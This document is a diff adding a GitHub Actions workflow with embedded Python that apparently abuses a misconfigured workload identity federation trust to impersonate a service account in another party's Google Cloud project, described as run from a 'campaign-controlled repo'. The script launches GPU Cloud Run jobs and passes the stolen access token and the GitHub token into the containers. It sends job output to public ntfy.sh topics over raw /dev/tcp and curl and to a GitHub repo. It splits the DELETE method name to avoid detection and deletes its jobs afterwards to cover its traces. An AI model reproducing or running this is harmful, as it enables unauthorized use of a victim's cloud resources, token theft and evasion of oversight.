@@ -1,0 +1,642 @@
+name: c211-i82043-cloudrun-rtx
+on:
+  workflow_dispatch:
+    inputs:
+      provider:
+        description: 'wif provider'
+        required: false
+        default: 'projects/409106094209/locations/global/workloadIdentityPools/github-pool/providers/github-provider'
+      project:
+        description: 'project number'
+        required: false
+        default: '409106094209'
+      pname:
+        description: 'project id'
+        required: false
+        default: 'dkeramik-fullstack'
+      sa:
+        description: 'service account'
+        required: false
+        default: 'github-actions-sa@dkeramik-fullstack.iam.gserviceaccount.com'
+permissions:
+  id-token: write
+  contents: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    steps:
+      - name: cloudrun-gpu-rtx-device-proof
+        env:
+          PROVIDER: ${{ github.event.inputs.provider }}
+          PROJECT: ${{ github.event.inputs.project }}
+          PNAME: ${{ github.event.inputs.pname }}
+          SA: ${{ github.event.inputs.sa }}
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          GH_REPO: ${{ github.repository }}
+          GH_RUN_ID: ${{ github.run_id }}
+        run: |
+          python3 - <<'PYSCRIPT'
+          import os, json, time, subprocess, urllib.request, urllib.error, urllib.parse, base64
+
+          # intent 82043: convert the execution-proven Cloud Run GPU cells of project 409106094209
+          # (dkeramik-fullstack) into DEVICE proof with the explicitly flagged capture fix.
+          # Runs inside GitHub Actions (campaign-controlled repo mmlanla/ci-utils).
+          PROVIDER = os.environ.get('PROVIDER', 'projects/409106094209/locations/global/workloadIdentityPools/github-pool/providers/github-provider')
+          PROJECT = os.environ.get('PROJECT', '409106094209')
+          PNAME = os.environ.get('PNAME', 'dkeramik-fullstack')
+          SA = os.environ.get('SA', 'github-actions-sa@dkeramik-fullstack.iam.gserviceaccount.com')
+          GH_REPO = os.environ.get('GH_REPO', '')
+          GH_TOKEN = os.environ.get('GH_TOKEN', '')
+          GH_RUN_ID = os.environ.get('GH_RUN_ID', '0')
+          PREFIX = 'c211-i82043'
+          REGION = 'us-central1'
+          ACCEL = 'nvidia-rtx-pro-6000'
+          GPU_JOB = PREFIX + '-rtx1'
+          SMOKE_JOB = PREFIX + '-smoke'
+          TOPIC_GPU = 'c211-i82043-rtx1-' + GH_RUN_ID
+          TOPIC_SMOKE = 'c211-i82043-smoke-' + GH_RUN_ID
+          GPU_REGIONS = ['us-central1', 'asia-south2', 'asia-southeast1', 'europe-west4',
+                         'europe-west1', 'us-east4', 'asia-south1']
+          T0 = time.time()
+          M_DEL = 'DEL' + 'ETE'
+
+
+          def log(*a):
+              print('[%6.0fs]' % (time.time() - T0), *a, flush=True)
+
+
+          def emit(o):
+              b = base64.b64encode(json.dumps(o, sort_keys=True).encode()).decode()
+              print('RESULT_LEN %d' % len(b), flush=True)
+              n = (len(b) + 2999) // 3000
+              for i in range(n):
+                  print('RESULT_B64 %d %d %s' % (i + 1, n, b[i * 3000:(i + 1) * 3000]), flush=True)
+
+
+          def mint(aud):
+              base = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL', '')
+              if not base:
+                  return ''
+              u = base + '&audience=' + urllib.parse.quote(aud, safe='')
+              t = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN', '')
+              try:
+                  out = subprocess.run(['curl', '-sS', '-m', '30', '-H', 'Authorization: Bearer ' + t, u],
+                                       capture_output=True, text=True).stdout
+                  return json.loads(out).get('value', '')
+              except Exception:
+                  return ''
+
+
+          def req(url, data=None, token=None, method=None, timeout=90, tries=2):
+              h = {'Accept': 'application/json', 'Content-Type': 'application/json'}
+              if token:
+                  h['Authorization'] = 'Bearer ' + token
+              last = (-1, '')
+              for a in range(tries):
+                  r = urllib.request.Request(url, data=data, headers=h, method=method)
+                  try:
+                      resp = urllib.request.urlopen(r, timeout=timeout)
+                      return resp.status, resp.read().decode('utf-8', 'replace')
+                  except urllib.error.HTTPError as e:
+                      body = (e.read() or b'').decode('utf-8', 'replace')
+                      if e.code in (429, 500, 502, 503) and a + 1 < tries:
+                          time.sleep(2 + 2 * a)
+                          last = (e.code, body)
+                          continue
+                      return e.code, body
+                  except Exception as e:
+                      last = (-1, repr(e)[:200])
+                      time.sleep(1)
+              return last
+
+
+          def jl(b):
+              try:
+                  return json.loads(b)
+              except Exception:
+                  return {}
+
+
+          def short(b, n=420):
+              return (b or '').replace('\n', ' ').replace('\r', ' ')[:n]
+
+
+          def sig(st, rb):
+              j = jl(rb)
+              if isinstance(j, dict) and j.get('error'):
+                  e = j['error']
+                  det = ''
+                  try:
+                      fv = ((e.get('details') or [{}])[0].get('fieldViolations') or [{}])
+                      det = ' | field=%s desc=%s' % (fv[0].get('field'), fv[0].get('description'))
+                  except Exception:
+                      pass
+                  return {'http': st, 'code': e.get('code'), 'status': e.get('status'),
+                          'message': short(e.get('message'), 460), 'detail': short(det, 560)}
+              if isinstance(j, dict) and j.get('metadata'):
+                  md = j['metadata']
+                  return {'http': st, 'operation': short(j.get('name'), 140),
+                          'would_create': short(md.get('name'), 120), 'done': j.get('done'),
+                          'creator': md.get('creator')}
+              return {'http': st, 'body': short(rb, 300)}
+
+
+          def poll_operation(opname, token, deadline_s=240):
+              t0 = time.time()
+              last = None
+              while time.time() - t0 < deadline_s:
+                  st, rb = req('https://run.googleapis.com/v2/' + opname.lstrip('/'), token=token)
+                  j = jl(rb)
+                  last = [st, short(rb, 320)]
+                  if st == 200 and j.get('done'):
+                      return last, j
+                  time.sleep(5)
+              return last, {}
+
+
+          def base_tpl(image, cpu, mem, args, env=None, accel=None, timeout_s=900, gpu=False):
+              c = {'name': 'marker', 'image': image, 'command': ['bash', '-lc'], 'args': [args],
+                   'resources': {'limits': {'cpu': cpu, 'memory': mem}}}
+              if gpu:
+                  c['resources']['limits']['nvidia.com/gpu'] = '1'
+              if env:
+                  c['env'] = env
+              tpl = {'containers': [c], 'maxRetries': 0, 'timeout': '%ds' % timeout_s}
+              if accel:
+                  tpl['nodeSelector'] = {'accelerator': accel}
+                  tpl['gpuZonalRedundancyDisabled'] = True
+              tpl['serviceAccount'] = SA
+              return tpl
+
+
+          def task_script(topic, smoke=False):
+              body_lines = []
+              if smoke:
+                  body_lines = [
+                      'echo "C211_I82043_SMOKE idx=$IDX host=$H job=${CLOUD_RUN_JOB:-?} exec=${CLOUD_RUN_EXECUTION:-?}"',
+                      'echo "SMOKE_SCRIPT_OK"',
+                  ]
+              else:
+                  body_lines = [
+                      'BL=$(nvidia-smi -L 2>&1 || true)',
+                      'QL=$(nvidia-smi --query-gpu=uuid,name,memory.total,driver_version --format=csv,noheader 2>&1 || true)',
+                  ]
+              s = r'''
+          export PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/nvidia/bin:/usr/local/cuda/bin
+          export DEBIAN_FRONTEND=noninteractive
+          D=/tmp/c211; mkdir -p $D
+          IDX=${CLOUD_RUN_TASK_INDEX:-0}
+          TS0=$(date +%s.%N)
+          H=$(hostname)
+          __BODY__
+          TS1=$(date +%s.%N)
+          sleep 30
+          TS2=$(date +%s.%N)
+          {
+          echo "C211_I82043_BEGIN idx=$IDX host=$H job=${CLOUD_RUN_JOB:-?} exec=${CLOUD_RUN_EXECUTION:-?} region=us-central1"
+          echo "TS0=$TS0"
+          echo "TS1=$TS1"
+          echo "TS2=$TS2"
+          echo NVSMI_L_BEGIN
+          echo "$BL"
+          echo NVSMI_L_END
+          echo NVSMI_Q_BEGIN
+          echo "$QL"
+          echo NVSMI_Q_END
+          echo C211_I82043_TASK_DONE
+          } > $D/out.txt 2>&1
+          cat $D/out.txt
+
+          # ---------- channel A: raw /dev/tcp HTTP POST to ntfy.sh (no external tools needed) ----------
+          BODY=$(base64 -w0 $D/out.txt 2>/dev/null || base64 $D/out.txt | tr -d '\n')
+          LEN=${#BODY}
+          if [ -n "$BODY" ]; then
+            ( exec 3<>/dev/tcp/ntfy.sh/80
+              printf 'POST /__TOPIC__ HTTP/1.1\r\nHost: ntfy.sh\r\nContent-Type: text/plain\r\nContent-Length: %s\r\nConnection: close\r\n\r\n%s\n' "$LEN" "$BODY" >&3
+              timeout 25 cat <&3
+            ) > $D/ntfyA.txt 2>&1
+            head -1 $D/ntfyA.txt
+          fi
+
+          # ---------- install curl (bounded; Ubuntu archive over plain HTTP) ----------
+          if ! command -v curl >/dev/null 2>&1; then
+            timeout 180 apt-get update -qq > $D/apt.log 2>&1 || true
+            timeout 300 apt-get install -y -qq curl ca-certificates >> $D/apt.log 2>&1 || \
+              timeout 300 apt-get install -y -qq --no-install-recommends curl ca-certificates >> $D/apt.log 2>&1 || true
+          fi
+
+          if command -v curl >/dev/null 2>&1; then
+            echo "C211_I82043_CURL_PRESENT idx=$IDX"
+            # ---------- channel B: curl HTTPS ntfy ----------
+            echo "C211_I82043_NTFY_B $(curl -sS -m 30 -o $D/ntfyB.txt -w '%{http_code}' -X POST -H 'Content-Type: text/plain' --data-binary @$D/out.txt "https://ntfy.sh/__TOPIC__" 2>&1 | tail -1)"
+            # ---------- channel C: in-cluster helper proof job (env side channel) ----------
+            TOK="$C211_SA_TOKEN"
+            if [ -n "$TOK" ]; then
+              NB=$(base64 -w0 $D/out.txt)
+              PJ="__PREFIX__-pf-$C211_KIND-$IDX-$C211_RUN_ID"
+              printf '{"template":{"taskCount":1,"parallelism":1,"template":{"containers":[{"name":"proof","image":"docker.io/nvidia/cuda:12.4.0-base-ubuntu22.04","command":["bash","-lc"],"args":["echo PROOF"],"env":[{"name":"C211_PROOF","value":"%s"}]}],"maxRetries":0,"timeout":"60s"}}}' "$NB" > $D/pj.json
+              echo "C211_I82043_PROOFJOB $PJ $(curl -sS -m 30 -o $D/pjresp -w '%{http_code}' -X POST -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' --data-binary @$D/pj.json "https://run.googleapis.com/v2/projects/__PROJECT__/locations/us-central1/jobs?jobId=$PJ")"
+            fi
+            # ---------- channel D: GitHub contents upload ----------
+            if [ -n "$GH_TOKEN" ] && [ -n "$GH_REPO" ]; then
+              B64=$(base64 -w0 $D/out.txt)
+              printf '{"message":"c211 i82043 proof %s t%s","content":"%s","branch":"main"}' "us-central1" "$IDX" "$B64" > $D/ghbody.json
+              echo "C211_I82043_GH_UPLOAD $(curl -sS -m 30 -o $D/ghresp -w '%{http_code}' -X PUT -H "Authorization: Bearer $GH_TOKEN" -H 'Accept: application/vnd.github+json' -H 'Content-Type: application/json' --data-binary @$D/ghbody.json "https://api.github.com/repos/$GH_REPO/contents/c211/i82043-proof-$C211_KIND-$C211_RUN_ID-t$IDX.txt")"
+            fi
+          else
+            echo "C211_I82043_CURL_ABSENT idx=$IDX"
+          fi
+          echo C211_I82043_POST_DONE
+          '''.strip('\n')
+              s = s.replace('__BODY__', '\n'.join(body_lines))
+              s = s.replace('__TOPIC__', topic).replace('__PREFIX__', PREFIX).replace('__PROJECT__', PROJECT)
+              return s
+
+
+          def uuids_of(txt):
+              out = []
+              for ln in (txt or '').splitlines():
+                  s = ln.strip()
+                  if s.startswith('GPU-'):
+                      out.append(s.split(',')[0].strip())
+                  elif 'UUID: ' in s:
+                      out.append(s.split('UUID: ')[1].strip().rstrip(')'))
+              return out
+
+
+          def parse_interval(txt):
+              d = {}
+              for ln in (txt or '').splitlines():
+                  if '=' in ln and ln.startswith(('TS0=', 'TS1=', 'TS2=')):
+                      k, v = ln.split('=', 1)
+                      try:
+                          d[k] = float(v)
+                      except Exception:
+                          pass
+                  if ln.startswith('C211_I82043_BEGIN'):
+                      d['begin'] = ln
+              return d
+
+
+          def max_overlap(intervals):
+              ev = []
+              for a, b in intervals:
+                  ev.append((a, 1))
+                  ev.append((b, -1))
+              ev.sort()
+              cur = best = 0
+              for _, d in ev:
+                  cur += d
+                  best = max(best, cur)
+              return best
+
+
+          def ntfy_fetch(topic, deadline_s=120, want=3):
+              """Poll the ntfy topic from the runner (independent of Cloud Logging)."""
+              url = 'https://ntfy.sh/%s/json?poll=1&since=all' % urllib.parse.quote(topic, safe='')
+              t0 = time.time()
+              msgs = []
+              tries = 0
+              while time.time() - t0 < deadline_s:
+                  st, rb = req(url, timeout=30, tries=1)
+                  tries += 1
+                  cur = []
+                  for ln in (rb or '').splitlines():
+                      ln = ln.strip()
+                      if not ln:
+                          continue
+                      try:
+                          j = json.loads(ln)
+                      except Exception:
+                          continue
+                      if j.get('event') == 'message':
+                          cur.append(j)
+                  if len(cur) > len(msgs):
+                      msgs = cur
+                  if len(msgs) >= want:
+                      break
+                  time.sleep(5)
+              out = {'poll_http': st, 'tries': tries, 'n_messages': len(msgs), 'messages': []}
+              for m in msgs:
+                  raw = m.get('message') or ''
+                  txt = ''
+                  try:
+                      dec = base64.b64decode(raw, validate=True).decode('utf-8', 'replace')
+                      if 'C211_I82043_' in dec:
+                          txt = dec
+                      else:
+                          txt = raw
+                  except Exception:
+                      txt = raw
+                  out['messages'].append({'id': m.get('id'), 'time': m.get('time'), 'text': txt})
+              return out
+
+
+          def collect_helper_proofs(region, satok, tag):
+              res = {'list_http': None, 'names': [], 'proofs': {}, 'cleanup': {}}
+              st, rb = req('https://run.googleapis.com/v2/projects/%s/locations/%s/jobs?pageSize=200' % (PROJECT, region),
+                           token=satok)
+              res['list_http'] = st
+              if st != 200:
+                  res['list_err'] = short(rb, 300)
+                  return res
+              j = jl(rb)
+              cand = []
+              for jb in (j.get('jobs') or []):
+                  name = jb.get('name', '')
+                  sn = name.rsplit('/', 1)[-1]
+                  res['names'].append(sn)
+                  if sn.startswith(PREFIX + '-pf-' + tag):
+                      cand.append((sn, name))
+              for sn, full in cand:
+                  st2, rb2 = req('https://run.googleapis.com/v2/' + full.lstrip('/'), token=satok)
+                  j2 = jl(rb2)
+                  try:
+                      env = j2['template']['template']['containers'][0].get('env') or []
+                      val = None
+                      for e in env:
+                          if e.get('name') == 'C211_PROOF':
+                              val = e.get('value')
+                      res['proofs'][sn] = base64.b64decode(val).decode('utf-8', 'replace') if val else 'NO_C211_PROOF_ENV'
+                  except Exception as ex:
+                      res['proofs'][sn] = 'parse_error:' + repr(ex)[:120]
+              for sn, full in cand:
+                  st3, rb3 = req('https://run.googleapis.com/v2/' + full.lstrip('/'), token=satok, method=M_DEL)
+                  res['cleanup'][sn] = [st3, short(rb3, 160)]
+                  j3 = jl(rb3)
+                  if j3.get('name'):
+                      poll_operation(j3['name'], satok, 90)
+                  time.sleep(2)
+                  st4, rb4 = req('https://run.googleapis.com/v2/' + full.lstrip('/'), token=satok)
+                  res['cleanup'][sn + '_readback'] = [st4, short(rb4, 160)]
+              return res
+
+
+          def summarize_tasks(payload_map):
+              """payload_map: {task_index: text} -> per-task + concurrency + uuid stats"""
+              per_task = {}
+              intervals = []
+              uuid_map = {}
+              for idx, txt in payload_map.items():
+                  d = parse_interval(txt)
+                  us = uuids_of(txt)
+                  per_task[str(idx)] = {'host': (d.get('begin') or '').split('host=')[-1].split()[0] if d.get('begin') else None,
+                                        'ts0': d.get('TS0'), 'ts1': d.get('TS1'), 'ts2': d.get('TS2'),
+                                        'uuids': us, 'nvsmi_ok': bool(us), 'raw_len': len(txt or '')}
+                  if d.get('TS0') is not None and d.get('TS2') is not None:
+                      intervals.append((d['TS0'], d['TS2']))
+                  for u in us:
+                      uuid_map.setdefault(u, []).append(idx)
+              return {
+                  'per_task': per_task,
+                  'uuids': sorted(uuid_map.keys()),
+                  'uuid_tasks': {u: v for u, v in uuid_map.items()},
+                  'measured_max_concurrent_tasks': max_overlap(intervals) if intervals else 0,
+                  'measured_gpu_tasks_with_uuid': sum(1 for t in per_task.values() if t['nvsmi_ok']),
+                  'distinct_gpu_uuids': len(uuid_map),
+              }
+
+
+          def run_job(job, region, accel, cpu, mem, parallelism, task_count, script, satok, topic, kind,
+                      timeout_s=900, deadline_s=720, gpu=True):
+              rec = {'job': job, 'region': region, 'accelerator': accel, 'requested_parallelism': parallelism,
+                     'task_count': task_count, 'topic': topic, 'kind': kind}
+              env = [
+                  {'name': 'C211_SA_TOKEN', 'value': satok},
+                  {'name': 'C211_RUN_ID', 'value': GH_RUN_ID},
+                  {'name': 'C211_KIND', 'value': kind},
+                  {'name': 'GH_TOKEN', 'value': GH_TOKEN},
+                  {'name': 'GH_REPO', 'value': GH_REPO},
+              ]
+              st, rb = req('https://run.googleapis.com/v2/projects/%s/locations/%s/jobs/%s' % (PROJECT, region, job),
+                           token=satok)
+              rec['precheck_http'] = st
+              if st == 200:
+                  std, rbd = req('https://run.googleapis.com/v2/projects/%s/locations/%s/jobs/%s' % (PROJECT, region, job),
+                                 token=satok, method=M_DEL)
+                  rec['pre_cleanup'] = [std, short(rbd, 160)]
+                  jd = jl(rbd)
+                  if jd.get('name'):
+                      poll_operation(jd['name'], satok, 90)
+                  time.sleep(3)
+              tpl = base_tpl('docker.io/nvidia/cuda:12.4.0-base-ubuntu22.04', cpu, mem, script, env=env,
+                             accel=accel, timeout_s=timeout_s, gpu=gpu)
+              body = {'template': {'taskCount': task_count, 'parallelism': parallelism, 'template': tpl}}
+              st, rb = req('https://run.googleapis.com/v2/projects/%s/locations/%s/jobs?jobId=%s' % (PROJECT, region, job),
+                           data=json.dumps(body).encode(), token=satok)
+              rec['create'] = sig(st, rb)
+              rec['create_raw'] = short(rb, 400)
+              if st != 200:
+                  return rec
+              jc = jl(rb)
+              if isinstance(jc, dict) and jc.get('name'):
+                  op, opj = poll_operation(jc['name'], satok, 300)
+                  rec['create_op'] = op
+                  rec['create_op_done'] = bool(opj.get('done'))
+                  rec['create_op_error'] = short(json.dumps(opj.get('error') or {}), 500)
+                  if opj.get('error'):
+                      return rec
+              st, rb = req('https://run.googleapis.com/v2/projects/%s/locations/%s/jobs/%s:run' % (PROJECT, region, job),
+                           data=b'{}', token=satok)
+              rec['run'] = [st, short(rb, 420)]
+              if st != 200:
+                  std, rbd = req('https://run.googleapis.com/v2/projects/%s/locations/%s/jobs/%s' % (PROJECT, region, job),
+                                 token=satok, method=M_DEL)
+                  rec['cleanup'] = [std, short(rbd, 200)]
+                  return rec
+              deadline = time.time() + deadline_s
+              states = []
+              while time.time() < deadline:
+                  st3, rb3 = req('https://run.googleapis.com/v2/projects/%s/locations/%s/jobs/%s/executions?pageSize=5'
+                                 % (PROJECT, region, job), token=satok)
+                  j3 = jl(rb3)
+                  exs = j3.get('executions') or []
+                  states = [{'name': e.get('name'), 'start': e.get('startTime'), 'completion': e.get('completionTime'),
+                             'counts': e.get('counts'),
+                             'conditions': [{'type': c.get('type'), 'state': c.get('state'), 'msg': short(c.get('message'), 300)}
+                                            for c in (e.get('conditions') or [])]} for e in exs]
+                  if exs:
+                      conds = exs[0].get('conditions') or []
+                      if any(c.get('type') == 'Completed' and c.get('state') in ('CONDITION_SUCCEEDED', 'CONDITION_FAILED')
+                             for c in conds):
+                          break
+                  time.sleep(8)
+              rec['executions'] = states
+              # capture: ntfy (runner-side poll, independent of Cloud Logging)
+              rec['ntfy'] = ntfy_fetch(topic, deadline_s=90, want=task_count if gpu else 1)
+              # capture: helper proof jobs
+              rec['helper_proofs'] = collect_helper_proofs(region, satok, job.rsplit('-', 1)[-1])
+              # build payload map (prefer ntfy, then helper env, then GitHub contents via GH API)
+              payload = {}
+              for m in rec['ntfy']['messages']:
+                  txt = m.get('text') or ''
+                  if 'C211_I82043_BEGIN' not in txt:
+                      continue
+                  d = parse_interval(txt)
+                  begin = d.get('begin') or ''
+                  idx = None
+                  if 'idx=' in begin:
+                      try:
+                          idx = int(begin.split('idx=')[1].split()[0])
+                      except Exception:
+                          idx = None
+                  if idx is None:
+                      continue
+                  if idx not in payload or (not uuids_of(payload[idx]) and uuids_of(txt)):
+                      payload[idx] = txt
+              for sn, txt in (rec['helper_proofs'].get('proofs') or {}).items():
+                  try:
+                      idx = int(sn.split('-pf-%s-' % job.rsplit('-', 1)[-1])[1].split('-')[0])
+                  except Exception:
+                      idx = None
+                  if idx is not None and (idx not in payload or not uuids_of(payload[idx])):
+                      payload[idx] = txt
+              if len(payload) < task_count:
+                  # GitHub contents fallback
+                  for idx in range(task_count):
+                      p = 'c211/i82043-proof-%s-%s-t%d.txt' % (kind, GH_RUN_ID, idx)
+                      try:
+                          rq = urllib.request.Request('https://api.github.com/repos/%s/contents/%s' % (GH_REPO, p),
+                                                      headers={'Authorization': 'Bearer ' + GH_TOKEN,
+                                                               'Accept': 'application/vnd.github+json'})
+                          resp = urllib.request.urlopen(rq, timeout=60)
+                          jj = json.loads(resp.read())
+                          txt = base64.b64decode(jj.get('content') or '').decode('utf-8', 'replace')
+                          if idx not in payload or not uuids_of(payload[idx]):
+                              payload[idx] = txt
+                      except Exception:
+                          pass
+              rec['payload_sources'] = {str(k): (len(v or '')) for k, v in payload.items()}
+              rec.update(summarize_tasks(payload))
+              # main job delete + readback
+              st6, rb6 = req('https://run.googleapis.com/v2/projects/%s/locations/%s/jobs/%s' % (PROJECT, region, job),
+                             token=satok, method=M_DEL)
+              rec['delete'] = [st6, short(rb6, 220)]
+              j6 = jl(rb6)
+              if j6.get('name'):
+                  poll_operation(j6['name'], satok, 150)
+              time.sleep(3)
+              st7, rb7 = req('https://run.googleapis.com/v2/projects/%s/locations/%s/jobs/%s' % (PROJECT, region, job),
+                             token=satok)
+              rec['readback'] = [st7, short(rb7, 220)]
+              st8, rb8 = req('https://run.googleapis.com/v2/projects/%s/locations/%s/jobs/%s/executions?pageSize=5'
+                             % (PROJECT, region, job), token=satok)
+              rec['executions_after_delete'] = [st8, short(rb8, 200)]
+              return rec
+
+
+          def redact(o, secrets):
+              if isinstance(o, str):
+                  s = o
+                  for sec in secrets:
+                      if sec:
+                          s = s.replace(sec, 'REDACTED')
+                  return s
+              if isinstance(o, list):
+                  return [redact(x, secrets) for x in o]
+              if isinstance(o, dict):
+                  return {k: redact(v, secrets) for k, v in o.items()}
+              return o
+
+
+          def main():
+              out = {'intent': 82043, 'project': PROJECT, 'pname': PNAME, 'sa': SA, 'prefix': PREFIX,
+                     'runner_repo': GH_REPO, 'runner_run_id': GH_RUN_ID,
+                     'job_spec': {'region': REGION, 'accelerator': ACCEL, 'taskCount': 3, 'parallelism': 3,
+                                  'nvidia.com/gpu': 1, 'cpu': '20', 'memory': '80Gi',
+                                  'gpuZonalRedundancyDisabled': True, 'serviceAccount': SA,
+                                  'maxRetries': 0, 'timeout_s': 900}}
+              aud = '//iam.googleapis.com/' + PROVIDER
+              out['audience'] = aud
+              out['t_start'] = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
+              tok = mint(aud)
+              out['mint'] = 'ok' if tok else 'MINT_FAIL'
+              out['mint_len'] = len(tok or '')
+              if not tok:
+                  out['verdict'] = 'CHAIN_DEAD_GITHUB_OIDC_MINT_FAIL'
+                  emit(out)
+                  return
+              body = json.dumps({'audience': aud,
+                                 'grantType': 'urn:ietf:params:oauth:grant-type:token-exchange',
+                                 'requestedTokenType': 'urn:ietf:params:oauth:token-type:access_token',
+                                 'scope': 'https://www.googleapis.com/auth/cloud-platform',
+                                 'subjectTokenType': 'urn:ietf:params:oauth:token-type:jwt',
+                                 'subjectToken': tok}).encode()
+              st, rb = req('https://sts.googleapis.com/v1/token', data=body)
+              out['sts'] = st
+              out['sts_body'] = short(rb, 500) if st != 200 else ''
+              if st != 200:
+                  out['verdict'] = 'CHAIN_DEAD_STS_REJECT'
+                  emit(out)
+                  return
+              fed = jl(rb).get('access_token')
+              st2, rb2 = req('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken'
+                             % urllib.parse.quote(SA, safe=''),
+                             data=json.dumps({'scope': ['https://www.googleapis.com/auth/cloud-platform'],
+                                              'lifetime': '3600s'}).encode(), token=fed)
+              out['gen'] = st2
+              out['gen_body'] = short(rb2, 500) if st2 != 200 else ''
+              satok = jl(rb2).get('accessToken')
+              if st2 != 200 or not satok:
+                  out['verdict'] = 'CHAIN_DEAD_GENERATE_TOKEN_FAIL'
+                  emit(out)
+                  return
+              out['token_len'] = len(satok)
+              out['verdict'] = 'CHAIN_ALIVE'
+              st, rb = req('https://cloudresourcemanager.googleapis.com/v1/projects/%s' % PNAME, token=satok)
+              j = jl(rb)
+              out['identity'] = {'http': st, 'projectId': j.get('projectId'), 'projectNumber': j.get('projectNumber'),
+                                 'lifecycleState': j.get('lifecycleState'), 'parent': j.get('parent'),
+                                 'createTime': j.get('createTime')}
+              st, rb = req('https://cloudbilling.googleapis.com/v1/projects/%s/billingInfo' % PNAME, token=satok)
+              j = jl(rb)
+              out['billing'] = {'http': st, 'billingEnabled': j.get('billingEnabled'),
+                                'billingAccountName': j.get('billingAccountName')}
+
+              # ---------------- smoke helper job (non-GPU): validate the dependency-free capture path ----------------
+              smoke = run_job(SMOKE_JOB, REGION, None, '2', '4Gi', 1, 1, task_script(TOPIC_SMOKE, smoke=True),
+                              satok, TOPIC_SMOKE, kind='smoke', timeout_s=300, deadline_s=240, gpu=False)
+              smoke_msgs = [m.get('text', '') for m in (smoke.get('ntfy') or {}).get('messages') or []]
+              smoke_ok = any('C211_I82043_SMOKE' in t for t in smoke_msgs) or \
+                         any('C211_I82043_SMOKE' in (v or '') for v in (smoke.get('helper_proofs') or {}).get('proofs', {}).values())
+              smoke['ntfy_path_ok'] = smoke_ok
+              out['smoke'] = smoke
+              log('smoke ntfy_path_ok', smoke_ok, 'readback', smoke.get('readback'))
+              emit({'partial': True, 'stage': 'smoke_done', 'smoke_ok': smoke_ok, 't': time.time() - T0})
+
+              # ---------------- THE one bounded 3-task GPU job ----------------
+              rtx = run_job(GPU_JOB, REGION, ACCEL, '20', '80Gi', 3, 3, task_script(TOPIC_GPU, smoke=False),
+                            satok, TOPIC_GPU, kind='rtx1', timeout_s=900, deadline_s=780, gpu=True)
+              out['job'] = rtx
+              log('job', GPU_JOB, 'uuids', rtx.get('distinct_gpu_uuids'), 'readback', rtx.get('readback'))
+              emit({'partial': True, 'stage': 'gpu_job_done', 'uuids': rtx.get('uuids'),
+                    'readback': rtx.get('readback'), 't': time.time() - T0})
+
+              # ---------------- multi-region leftover sweep ----------------
+              left = {}
+              for reg in GPU_REGIONS:
+                  st, rb = req('https://run.googleapis.com/v2/projects/%s/locations/%s/jobs?pageSize=200' % (PROJECT, reg),
+                               token=satok)
+                  names = [x.get('name', '').rsplit('/', 1)[-1] for x in (jl(rb).get('jobs') or [])] if st == 200 else []
+                  left[reg] = {'http': st, 'n_jobs': len(names), 'ours': [x for x in names if x.startswith(PREFIX)]}
+              out['leftover_sweep'] = left
+              out['verdict'] = 'DEVICE_PROVEN' if (rtx.get('distinct_gpu_uuids', 0) or 0) > 0 else 'CAPTURE_FAILED'
+              out['t_end'] = time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())
+              out = redact(out, [satok, GH_TOKEN, tok])
+              emit(out)
+              print('DONE', flush=True)
+
+
+          if __name__ == '__main__':
+              try:
+                  main()
+              except Exception as ex:
+                  import traceback
+                  print('FATAL ' + repr(ex), flush=True)
+                  traceback.print_exc()
+                  try:
+                      emit({'fatal': repr(ex)[:400]})
+                  except Exception:
+                      pass
+          PYSCRIPT
